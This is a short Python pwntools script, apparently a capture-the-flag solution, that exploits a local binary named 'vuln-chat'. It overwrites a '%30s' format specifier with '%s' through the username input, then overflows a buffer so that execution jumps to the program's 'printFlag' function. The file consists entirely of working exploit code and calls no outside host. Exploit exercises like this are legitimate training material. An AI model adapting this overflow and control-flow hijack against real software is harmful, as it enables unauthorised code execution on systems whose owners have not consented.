from pwn import *
from time import sleep

# context.log_level = 'debug'

p = process(['./vuln-chat'])
elf = ELF('./vuln-chat')

payload = b'A'*20
payload += b'%s' # overwrite %30s to %s so we can trigger bufferoverflow

p.sendlineafter(b"username: ",payload)

payload = b'A'*49
payload += p64(elf.symbols['printFlag'])

# gdb.attach(p)

p.sendlineafter(b"%s: ", payload)

p.interactive()